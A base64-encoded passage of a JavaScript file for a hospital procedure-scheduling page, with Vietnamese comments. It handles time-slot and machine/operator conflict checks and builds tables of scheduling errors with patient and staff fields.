WR1cmVzLCBvcGVyYXRvciwgZGF0ZSkpIHsNCiAgICAgICAgICAgIHNsb3RzLnB1c2goew0KICAgICAgICAgICAgICAgIHN0YXJ0OiBzZWNvbmRzVG9UaW1lU3RyKGN1cnJlbnRUaW1lKSwNCiAgICAgICAgICAgICAgICBlbmQ6IHNlY29uZHNUb1RpbWVTdHIoY3VycmVudFRpbWUgKyBkdXJhdGlvbikNCiAgICAgICAgICAgIH0pOw0KICAgICAgICB9DQogICAgICAgIGN1cnJlbnRUaW1lICs9IDE1ICogNjA7IC8vIEtp4buDbSB0cmEgbeG7l2kgMTUgcGjDunQNCiAgICB9DQogICAgDQogICAgcmV0dXJuIHNsb3RzOw0KfQ0KDQovLyBIw6BtIGtp4buDbSB0cmEgeHVuZyDEkeG7mXQgdGjhu51pIGdpYW4gY2hvIG3DoXkNCmZ1bmN0aW9uIGhhc01hY2hpbmVUaW1lQ29uZmxpY3Qoc3RhcnRUaW1lLCBkdXJhdGlvbiwgbWFjaGluZVByb2NlZHVyZXMsIGNvbmZsaWN0UHJvY2VkdXJlcywgb3BlcmF0b3IsIGRhdGUpIHsNCiAgICBjb25zdCBlbmRUaW1lID0gc3RhcnRUaW1lICsgZHVyYXRpb247DQogICAgDQogICAgLy8gS2nhu4NtIHRyYSB4dW5nIMSR4buZdCBtw6F5DQogICAgZm9yIChjb25zdCBwcm9jIG9mIG1hY2hpbmVQcm9jZWR1cmVzKSB7DQogICAgICAgIGlmIChwcm9jLnN0YXJ0IDwgZW5kVGltZSAmJiBwcm9jLmVuZCA+IHN0YXJ0VGltZSkgew0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0NCiAgICB9DQogICAgDQogICAgLy8gS2nhu4NtIHRyYSB4dW5nIMSR4buZdCBuZ8aw4budaSB0aOG7sWMgaGnhu4duDQogICAgaWYgKHdpbmRvdy5hbGxQcm9jZWR1cmVzKSB7DQogICAgICAgIGNvbnN0IG9wZXJhdG9yUHJvY2VkdXJlcyA9IHdpbmRvdy5hbGxQcm9jZWR1cmVzLmZpbHRlcihwID0+IA0KICAgICAgICAgICAgcC5vcGVyYXRvciA9PT0gb3BlcmF0b3IgJiYgDQogICAgICAgICAgICBwLmRhdGUgPT09IGRhdGUgJiYNCiAgICAgICAgICAgICFjb25mbGljdFByb2NlZHVyZXMuaW5jbHVkZXMocCkNCiAgICAgICAgKTsNCiAgICAgICAgDQogICAgICAgIGZvciAoY29uc3QgcHJvYyBvZiBvcGVyYXRvclByb2NlZHVyZXMpIHsNCiAgICAgICAgICAgIGNvbnN0IHByb2NTdGFydCA9IHByb2Muc3RhcnQ7DQogICAgICAgICAgICBjb25zdCBwcm9jRW5kID0gcHJvYy5lbmQgKyAocHJvYy5wcm9jZWR1cmVJbmZvPy5idWZmZXIgfHwgMCkgKiA2MDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKChzdGFydFRpbWUgPj0gcHJvY1N0YXJ0ICYmIHN0YXJ0VGltZSA8IHByb2NFbmQpIHx8IA0KICAgICAgICAgICAgICAgIChlbmRUaW1lID4gcHJvY1N0YXJ0ICYmIGVuZFRpbWUgPD0gcHJvY0VuZCkgfHwNCiAgICAgICAgICAgICAgICAoc3RhcnRUaW1lIDw9IHByb2NTdGFydCAmJiBlbmRUaW1lID49IHByb2NFbmQpKSB7DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgDQogICAgcmV0dXJuIGZhbHNlOw0KfQ0KDQovLyBIw6BtIGPhuq1wIG5o4bqtdCBVSSBn4bujaSDDvQ0KLy8gSMOgbSBj4bqtcCBuaOG6rXQgVUkgZ+G7o2kgw70NCmZ1bmN0aW9uIHVwZGF0ZU1hY2hpbmVTdWdnZXN0aW9uVUkobWFjaGluZUNvZGUsIGRhdGUsIHByb2NlZHVyZXMpIHsNCiAgICBjb25zdCBzdWdnZXN0aW9uQ2VsbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGBtYWNoaW5lU3VnZ2VzdGlvbi0ke21hY2hpbmVDb2RlfS0ke2RhdGV9YCk7DQogICAgaWYgKHN1Z2dlc3Rpb25DZWxsKSB7DQogICAgICAgIC8vIEzhuqV5IGfhu6NpIMO9IHThu6sgdGjhu6cgdGh14bqtdCDEkeG6p3UgdGnDqm4gKHbDrCB04bqldCBj4bqjIMSR4buBdSBnaeG7kW5nIG5oYXUpDQogICAgICAgIGNvbnN0IGZpcnN0UHJvYyA9IHByb2NlZHVyZXNbMF07DQogICAgICAgIGlmIChmaXJzdFByb2MgJiYgZmlyc3RQcm9jLm1hY2hpbmVTdWdnZXN0aW9uKSB7DQogICAgICAgICAgICBzdWdnZXN0aW9uQ2VsbC5pbm5lckhUTUwgPSBmaXJzdFByb2MubWFjaGluZVN1Z2dlc3Rpb247DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBzdWdnZXN0aW9uQ2VsbC5pbm5lckhUTUwgPSAnPHNwYW4gY2xhc3M9Im5vLXN1Z2dlc3Rpb24iPktow7RuZyBjw7Mga2h1bmcgZ2nhu50gdHLhu5FuZzwvc3Bhbj4nOw0KICAgICAgICB9DQogICAgfQ0KfQ0KDQoNCg0KDQoNCi8vIEjDoG0gaGnhu4NuIHRo4buLIGzhu5dpIHF1w6puIGfhuq9uIG3DoyBtw6F5DQpmdW5jdGlvbiBkaXNwbGF5TWlzc2luZ01hY2hpbmVFcnJvcnMoKSB7DQogICAgY29uc3QgbWlzc2luZ01hY2hpbmVMb2dEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWlzc2luZ01hY2hpbmVMb2cnKTsNCiAgICBjb25zdCBtaXNzaW5nTWFjaGluZVNlY3Rpb24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWlzc2luZ01hY2hpbmVTZWN0aW9uJyk7DQogICAgaWYgKG1pc3NpbmdNYWNoaW5lTG9nLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBtaXNzaW5nTWFjaGluZUxvZ0Rpdi5pbm5lckhUTUwgPSAnPHA+S2jDtG5nIGPDsyBs4buXaSBxdcOqbiBn4bqvbiBtw6MgbcOheSBuw6BvIMSRxrDhu6NjIGdoaSBuaOG6rW48L3A+JzsNCiAgICAgICAgbWlzc2luZ01hY2hpbmVTZWN0aW9uLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgDQogICAgY29uc3Qgc2hvd0RvY3RvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93RG9jdG9yQ2hlY2tib3gnKS5jaGVja2VkOw0KICAgIGNvbnN0IGRvY3RvckNvbHVtblN0eWxlID0gc2hvd0RvY3RvciA/ICcnIDogJ2Rpc3BsYXk6bm9uZSc7DQogICAgDQogICAgbGV0IGh0bWwgPSBgDQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgICAgICA8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke2RvY3RvckNvbHVtblN0eWxlfSI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT5gOw0KICAgIA0KICAgIG1pc3NpbmdNYWNoaW5lTG9nLmZvckVhY2goZXJyb3IgPT4gew0KICAgICAgICBodG1sICs9IGANCiAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3IucGF0aWVudE5hbWV9IFs8Zm9udCBjb2xvcj0icmVkIj4ke2Vycm9yLnBhdGllbnRBZ2V9PC9mb250Pl08YnIvPiR7ZXJyb3IucGF0aWVudElkfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wcm9jZWR1cmV9PC90ZD4NCiAgICAgICAgICAgIDx0ZCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij4ke2Vycm9yLmRvY3RvciB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpfTwvdGQ+DQogICAgICAgICAgICA8dGQ+PGNlbnRlcj4ke2Vycm9yLmRhdGV9PGJyLz4ke2Vycm9yLnN0YXJ0VGltZX0g4oaSICR7ZXJyb3IuZW5kVGltZX08L2NlbnRlcj48L3RkPg0KICAgICAgICA8L3RyPmA7DQogICAgfSk7DQogICAgDQogICAgaHRtbCArPSBgPC90Ym9keT48L3RhYmxlPmA7DQogICAgDQogICAgbWlzc2luZ01hY2hpbmVMb2dEaXYuaW5uZXJIVE1MID0gaHRtbDsNCiAgICBtaXNzaW5nTWFjaGluZVNlY3Rpb24uc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgDQogICAgLy8gQ+G6rXAgbmjhuq10IGRyb3Bkb3duIGzhu41jDQogICAgdXBkYXRlTWlzc2luZ01hY2hpbmVPcGVyYXRvckZpbHRlcigpOw0KfQ0KDQovLyBD4bqtcCBuaOG6rXQgZHJvcGRvd24gbOG7jWMgY2hvIHF1w6puIGfhuq9uIG3DoyBtw6F5DQpmdW5jdGlvbiB1cGRhdGVNaXNzaW5nTWFjaGluZU9wZXJhdG9yRmlsdGVyKCkgew0KICAgIGNvbnN0IG9wZXJhdG9ycyA9IFsuLi5uZXcgU2V0KG1pc3NpbmdNYWNoaW5lTG9nLm1hcChlcnJvciA9PiBlcnJvci5vcGVyYXRvcikpXTsNCiAgICBjb25zdCBvcGVyYXRvclNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtaXNzaW5nTWFjaGluZU9wZXJhdG9yU2VsZWN0Jyk7DQogICAgb3BlcmF0b3JTZWxlY3QuaW5uZXJIVE1MID0gJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPicgKyANCiAgICAgICAgb3BlcmF0b3JzLm1hcChvcCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtvcH0iPiR7b3AucmVwbGFjZSgvLC9nLCAnJyl9PC9vcHRpb24+YCkuam9pbignJyk7DQogICAgDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21pc3NpbmdNYWNoaW5lT3BlcmF0b3JGaWx0ZXInKS5zdHlsZS5kaXNwbGF5ID0gb3BlcmF0b3JzLmxlbmd0aCA+IDAgPyAnYmxvY2snIDogJ25vbmUnOw0KfQ0KDQovLyBM4buNYyBxdcOqbiBn4bqvbiBtw6MgbcOheSB0aGVvIG5nxrDhu51pIHRo4buxYyBoaeG7h24NCmZ1bmN0aW9uIGZpbHRlck1pc3NpbmdNYWNoaW5lQnlPcGVyYXRvcigpIHsNCiAgICBjb25zdCBvcGVyYXRvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtaXNzaW5nTWFjaGluZU9wZXJhdG9yU2VsZWN0JykudmFsdWU7DQogICAgY29uc3QgZmlsdGVyZWRFcnJvcnMgPSBvcGVyYXRvciA9PT0gJ2FsbCcgDQogICAgICAgID8gbWlzc2luZ01hY2hpbmVMb2cgDQogICAgICAgIDogbWlzc2luZ01hY2hpbmVMb2cuZmlsdGVyKGVycm9yID0+IGVycm9yLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpID09PSBvcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKSk7DQogICAgDQogICAgZGlzcGxheUZpbHRlcmVkTWlzc2luZ01hY2hpbmVFcnJvcnMoZmlsdGVyZWRFcnJvcnMpOw0KfQ0KDQovLyBIaeG7g24gdGjhu4sgbOG7l2kgcXXDqm4gZ+G6r24gbcOjIG3DoXkgxJHDoyBs4buNYw0KZnVuY3Rpb24gZGlzcGxheUZpbHRlcmVkTWlzc2luZ01hY2hpbmVFcnJvcnMoZmlsdGVyZWRFcnJvcnMpIHsNCiAgICBjb25zdCBtaXNzaW5nTWFjaGluZUxvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtaXNzaW5nTWFjaGluZUxvZycpOw0KICAgICBjb25zdCBzaG93RG9jdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgY29uc3QgZG9jdG9yQ29sdW1uU3R5bGUgPSBzaG93RG9jdG9yID8gJycgOiAnZGlzcGxheTpub25lJzsNCiAgICBpZiAoZmlsdGVyZWRFcnJvcnMubGVuZ3RoID09PSAwKSB7DQogICAgICAgIG1pc3NpbmdNYWNoaW5lTG9nRGl2LmlubmVySFRNTCA9ICc8cD5LaMO0bmcgY8OzIGzhu5dpIHF1w6puIGfhuq9uIG3DoyBtw6F5IG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvcD4nOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIGxldCBodG1sID0gYA0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQoJCQkJPHRoIGNsYXNzPSJkb2N0b3ItY29sdW1uIiBzdHlsZT0iJHtkb2N0b3JDb2x1bW5TdHlsZX0iPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1tZCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gQsOhYyBz4bu5IGNo4buJIMSR4buLbmg8L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXItbnVyc2UgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICAgICANCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT5gOw0KICAgIA0KICAgIGZpbHRlcmVkRXJyb3JzLmZvckVhY2goZXJyb3IgPT4gew0KICAgICAgICBodG1sICs9IGANCiAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3IucGF0aWVudE5hbWV9IFs8Zm9udCBjb2xvcj0icmVkIj4ke2Vycm9yLnBhdGllbnRBZ2V9PC9mb250Pl08YnIvPiR7ZXJyb3IucGF0aWVudElkfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wcm9jZWR1cmV9PC90ZD4NCgkJCTx0ZCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij4ke2Vycm9yLmRvY3RvciB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpfTwvdGQ+DQogICAgICAgICAgICA8dGQ+PGNlbnRlcj4ke2Vycm9yLmRhdGV9PGJyLz4ke2Vycm9yLnN0YXJ0VGltZX0g4oaSICR7ZXJyb3IuZW5kVGltZX08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgDQogICAgICAgIDwvdHI+YDsNCiAgICB9KTsNCiAgICANCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICANCiAgICBtaXNzaW5nTWFjaGluZUxvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KfQ0KDQoNCi8vL2jDoG0gaGnhu4NuIHRo4buLIG5nw6B5IHRo4buxYyBoaeG7h24ga2jDoWMgLy8vDQovLyBIw6BtIGhp4buDbiB0aOG7iyBs4buXaSBkYXRlIG1pc21hdGNoDQpmdW5jdGlvbiBkaXNwbGF5RGF0ZU1pc21hdGNoRXJyb3JzKCkgew0KICAgIGNvbnN0IGRhdGVNaXNtYXRjaExvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkYXRlTWlzbWF0Y2hMb2cnKTsNCiAgICBjb25zdCBkYXRlTWlzbWF0Y2hTZWN0aW9uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RhdGVNaXNtYXRjaFNlY3Rpb24nKTsNCiAgICANCiAgICBpZiAoZGF0ZU1pc21hdGNoTG9nLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBkYXRlTWlzbWF0Y2hMb2dEaXYuaW5uZXJIVE1MID0gJzxwPktow7RuZyBjw7MgbOG7l2kgdGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1IGtow6FjIG5nw6B5IHRo4buxYyBoaeG7h24gbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC9wPic7DQogICAgICAgIGRhdGVNaXNtYXRjaFNlY3Rpb24uc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICANCiAgICBjb25zdCBzaG93RG9jdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgY29uc3QgZG9jdG9yQ29sdW1uU3R5bGUgPSBzaG93RG9jdG9yID8gJycgOiAnZGlzcGxheTpub25lJzsNCiAgICANCiAgICBsZXQgaHRtbCA9IGANCiAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXIgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFTDqm4gQk48L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXByb2NlZHVyZXMgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4bunIHRodeG6rXQ8L3RoPg0KICAgICAgICAgICAgICAgIDx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij48aSBjbGFzcz0iZmFzIGZhLXVzZXItbWQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IELDoWMgc+G7uSBjaOG7iSDEkeG7i25oPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jYWxlbmRhci1hbHQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nw6B5IHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3U8L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLXRyaWFuZ2xlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBM4buXaTwvdGg+DQogICAgICAgICAgICA8L3RyPg0KICAgICAgICA8L3RoZWFkPg0KICAgICAgICA8dGJvZHk+YDsNCiAgICANCiAgICBkYXRlTWlzbWF0Y2hMb2cuZm9yRWFjaChlcnJvciA9PiB7DQogICAgICAgIGh0bWwgKz0gYA0KICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wYXRpZW50TmFtZX0gWzxmb250IGNvbG9yPSJyZWQiPiR7ZXJyb3IucGF0aWVudEFnZX08L2ZvbnQ+XTxici8+JHtlcnJvci5wYXRpZW50SWR9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLnByb2NlZHVyZX08L3RkPg0KICAgICAgICAgICAgPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIiBzdHlsZT0iJHtkb2N0b3JDb2x1bW5TdHlsZX0iPiR7ZXJyb3IuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3Iub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7ZXJyb3IucHJvY2VkdXJlRGF0ZX08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5zdGFydERhdGV9PGJyLz4ke2Vycm9yLnN0YXJ0VGltZX08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgPHRkIGNsYXNzPSJlcnJvci1kZXRhaWwiPg0KICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0NCiAgICAgICAgICAgIDwvdGQ+DQogICAgICAgIDwvdHI+YDsNCiAgICB9KTsNCiAgICANCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICANCiAgICBkYXRlTWlzbWF0Y2hMb2dEaXYuaW5uZXJIVE1MID0gaHRtbDsNCiAgICBkYXRlTWlzbWF0Y2hTZWN0aW9uLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgIA0KICAgIC8vIEPhuq1wIG5o4bqtdCBkcm9wZG93biBs4buNYw0KICAgIHVwZGF0ZURhdGVNaXNtYXRjaE9wZXJhdG9yRmlsdGVyKCk7DQp9DQoNCi8vIEPhuq1wIG5o4bqtdCBkcm9wZG93biBs4buNYyBjaG8gZGF0ZSBtaXNtYXRjaA0KZnVuY3Rpb24gdXBkYXRlRGF0ZU1pc21hdGNoT3BlcmF0b3JGaWx0ZXIoKSB7DQogICAgY29uc3Qgb3BlcmF0b3JzID0gWy4uLm5ldyBTZXQoZGF0ZU1pc21hdGNoTG9nLm1hcChlcnJvciA9PiBlcnJvci5vcGVyYXRvcikpXTsNCiAgICBjb25zdCBvcGVyYXRvclNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkYXRlTWlzbWF0Y2hPcGVyYXRvclNlbGVjdCcpOw0KICAgIA0KICAgIG9wZXJhdG9yU2VsZWN0LmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsgDQogICAgICAgIG9wZXJhdG9ycy5tYXAob3AgPT4gYDxvcHRpb24gdmFsdWU9IiR7b3B9Ij4ke29wLnJlcGxhY2UoLywvZywgJycpfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIA0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkYXRlTWlzbWF0Y2hPcGVyYXRvckZpbHRlcicpLnN0eWxlLmRpc3BsYXkgPSBvcGVyYXRvcnMubGVuZ3RoID4gMCA/ICdibG9jaycgOiAnbm9uZSc7DQp9DQoNCi8vIEzhu41jIGRhdGUgbWlzbWF0Y2ggdGhlbyBuZ8aw4budaSB0aOG7sWMgaGnhu4duDQpmdW5jdGlvbiBmaWx0ZXJEYXRlTWlzbWF0Y2hCeU9wZXJhdG9yKCkgew0KICAgIGNvbnN0IG9wZXJhdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RhdGVNaXNtYXRjaE9wZXJhdG9yU2VsZWN0JykudmFsdWU7DQogICAgY29uc3QgZmlsdGVyZWRFcnJvcnMgPSBvcGVyYXRvciA9PT0gJ2FsbCcgDQogICAgICAgID8gZGF0ZU1pc21hdGNoTG9nIA0KICAgICAgICA6IGRhdGVNaXNtYXRjaExvZy5maWx0ZXIoZXJyb3IgPT4gZXJyb3Iub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgPT09IG9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpKTsNCiAgICANCiAgICBkaXNwbGF5RmlsdGVyZWREYXRlTWlzbWF0Y2hFcnJvcnMoZmlsdGVyZWRFcnJvcnMpOw0KfQ0KDQovLyBIaeG7g24gdGjhu4sgbOG7l2kgZGF0ZSBtaXNtYXRjaCDEkcOjIGzhu41jDQpmdW5jdGlvbiBkaXNwbGF5RmlsdGVyZWREYXRlTWlzbWF0Y2hFcnJvcnMoZmlsdGVyZWRFcnJvcnMpIHsNCiAgICBjb25zdCBkYXRlTWlzbWF0Y2hMb2dEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZGF0ZU1pc21hdGNoTG9nJyk7DQogICAgY29uc3Qgc2hvd0RvY3RvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93RG9jdG9yQ2hlY2tib3gnKS5jaGVja2VkOw0KICAgIGNvbnN0IGRvY3RvckNvbHVtblN0eWxlID0gc2hvd0RvY3RvciA/ICcnIDogJ2Rpc3BsYXk6bm9uZSc7DQogICAgDQogICAgaWYgKGZpbHRlcmVkRXJyb3JzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBkYXRlTWlzbWF0Y2hMb2dEaXYuaW5uZXJIVE1MID0gJzxwPktow7RuZyBjw7MgbOG7l2kgdGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1IGtow6FjIG5nw6B5IHRo4buxYyBoaeG7h24gbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC9wPic7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgDQogICAgbGV0IGh0bWwgPSBgDQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgICAgICA8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke2RvY3RvckNvbHVtblN0eWxlfSI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2FsZW5kYXItYWx0IGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8OgeSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1PC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQogICAgDQogICAgZmlsdGVyZWRFcnJvcnMuZm9yRWFjaChlcnJvciA9PiB7DQogICAgICAgIGh0bWwgKz0gYA0KICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgI